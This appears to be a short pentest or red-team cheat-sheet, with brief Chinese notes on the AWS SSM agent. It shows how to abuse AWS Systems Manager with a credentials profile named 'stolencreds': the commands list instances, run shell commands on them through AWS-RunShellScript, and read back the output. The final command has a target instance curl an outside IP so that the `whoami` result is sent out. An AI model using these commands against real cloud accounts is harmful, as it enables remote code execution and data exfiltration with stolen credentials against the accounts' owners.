	卸载 SSM 代理时，不会从系统中删除 ssm-user 帐户。
	默认情况下，SSM 代理预安装在以下 Amazon 系统映像 (AMI) 上
	>aws ssm describe-instance-information --profile stolencreds --region eu-west-1  
	>aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --comment "IP Config" --parameters commands=ifconfig --output text --query "Command.CommandId" --profile stolencreds
	>aws ssm list-command-invocations --command-id "COMMAND-ID-HERE" --details --query "CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}" --profile stolencreds
	>aws ssm send-command --instance-ids "i-05b████████adaa" --document-name "AWS-RunShellScript" --comment "whoami" --parameters commands='curl 162.243.███.███:8080/`whoami`' --output text --region=us-east-1